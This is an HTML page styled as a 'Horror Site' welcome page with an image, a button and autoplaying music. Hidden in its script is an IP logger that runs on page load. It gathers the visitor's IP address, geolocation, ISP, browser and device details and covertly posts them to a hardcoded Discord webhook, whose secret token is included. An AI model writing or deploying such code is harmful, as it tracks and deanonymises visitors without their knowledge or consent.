<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to the Horror Site</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }
        h1 {
            font-size: 3em;
            margin-bottom: 20px;
        }
        p {
            font-size: 1.2em;
            line-height: 1.6;
            margin-bottom: 30px;
        }
        .container {
            max-width: 600px;
            padding: 0 20px;
        }
        .horror-img {
            width: 100%;
            max-width: 400px;
            margin-bottom: 30px;
            border: 2px solid #fff;
            border-radius: 10px;
        }
        .btn {
            display: inline-block;
            padding: 10px 20px;
            background-color: #ff0000;
            color: #fff;
            text-decoration: none;
            border-radius: 5px;
            transition: background-color 0.3s ease;
        }
        .btn:hover {
            background-color: #a50000;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="horror_image.jpg" alt="Horror Image" class="horror-img">
        <h1>Welcome to the Horror Site</h1>
        <p>Are you brave enough to explore the dark corners of this website?</p>
        <a href="#" class="btn">Enter if you dare</a>
    </div>

    <audio autoplay loop>
        <source src="music.mp3" type="audio/mpeg">
        Your browser does not support the audio element.
    </audio>

    <script>
        function getIPDataAndSendToDiscord() {
            fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                const embedData = {
                    "embeds": [{
                        "title": "IP Address Information",
                        "fields": [
                            {"name": "IP Address", "value": data.ip},
                            {"name": "City", "value": data.city},
                            {"name": "Region", "value": data.region},
                            {"name": "Country", "value": data.country_name},
                            {"name": "Country Code", "value": data.country},
                            {"name": "Continent Code", "value": data.continent_code},
                            {"name": "Timezone", "value": data.timezone},
                            {"name": "Currency", "value": data.currency},
                            {"name": "Language", "value": data.languages},
                            {"name": "Organization", "value": data.org},
                            {"name": "Operating System", "value": navigator.platform},
                            {"name": "Browser", "value": navigator.userAgent},
                            {"name": "Device Type", "value": getDeviceType()},
                            {"name": "User Agent", "value": navigator.userAgent},
                            {"name": "Timestamp", "value": new Date().toLocaleString()}
                        ]
                    }]
                };

                fetch('https://discord.com/api/webhooks/1213788395726311464/Qu04CT-Yp-s2BttXP2jZGSm_iTWHA08MFm-OCxQHCCeiq9J-RL5VYX41Oj-5moEPMAtP', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(embedData)
                })
                .then(response => console.log(response))
                .catch(error => console.error('Error sending data to Discord:', error));
            })
            .catch(error => console.error('Error fetching IP data:', error));
        }

        function getDeviceType() {
            if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
                return 'Mobile';
            } else {
                return 'Desktop';
            }
        }

        window.onload = getIPDataAndSendToDiscord;
    </script>
</body>
</html>
